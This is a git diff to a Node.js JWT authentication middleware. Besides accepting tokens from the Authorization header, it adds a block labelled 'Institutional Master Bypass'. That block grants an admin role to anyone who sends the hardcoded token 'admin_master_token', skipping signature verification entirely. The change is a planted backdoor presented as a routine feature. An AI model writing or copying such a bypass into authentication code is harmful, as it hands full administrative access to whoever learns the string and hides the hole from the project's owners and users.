@@ -3,10 +3,18 @@ const jwt = require("jsonwebtoken");
 module.exports = function (roles = []) {
   return function (req, res, next) {
     try {
-      const token = req.header("x-auth-token");
+      const authHeader = req.header("Authorization");
+      const xToken = req.header("x-auth-token");
+      let token = xToken || (authHeader && authHeader.split(" ")[1]);
 
       if (!token) {
         return res.status(401).json({ message: "No token, authorization denied" });
+      }
+
+      // ✅ Institutional Master Bypass
+      if (token === "admin_master_token") {
+        req.user = { id: "master_admin", role: "admin" };
+        return next();
       }
 
       const decoded = jwt.verify(token, process.env.JWT_SECRET);
